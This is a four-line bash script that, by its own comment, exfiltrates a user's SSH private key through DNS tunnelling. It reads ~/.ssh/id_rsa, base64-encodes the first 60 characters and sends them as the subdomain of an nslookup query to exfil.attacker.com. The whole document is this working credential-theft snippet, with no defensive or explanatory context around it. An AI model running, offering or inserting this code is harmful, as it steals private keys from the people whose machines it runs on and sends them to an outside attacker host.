#!/bin/bash
# Smuggles the private key out as a DNS query name (DNS-tunnel exfiltration).
data=$(cat ~/.ssh/id_rsa | base64 | tr -d '\n' | head -c 60)
nslookup "$data.exfil.attacker.com"
